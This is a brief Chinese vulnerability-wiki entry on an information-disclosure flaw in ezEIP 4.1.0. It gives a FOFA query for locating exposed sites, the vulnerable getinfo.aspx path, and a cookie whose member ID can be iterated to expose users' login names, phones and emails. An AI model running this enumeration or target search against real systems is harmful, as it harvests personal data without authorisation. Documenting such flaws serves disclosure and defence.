# ezEIP 4.1.0 信息泄露漏洞

## 漏洞描述

ezEIP 4.1.0 存在信息泄露漏洞，通过遍历Cookie中的参数值获取敏感信息

## 漏洞影响

> [!NOTE]
>
> ezEIP 4.1.0 

## FOFA

> [!NOTE]
>
> "ezEIP"

## 漏洞复现

漏洞Url为

```
/label/member/getinfo.aspx
```

访问时添加Cookie（通过遍历获取用户的登录名电话邮箱等信息）

```
WHIR_USERINFOR=whir_mem_member_pid=1;
```

![ez-1](http://wikioss.peiqi.tech/vuln/ez-1.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)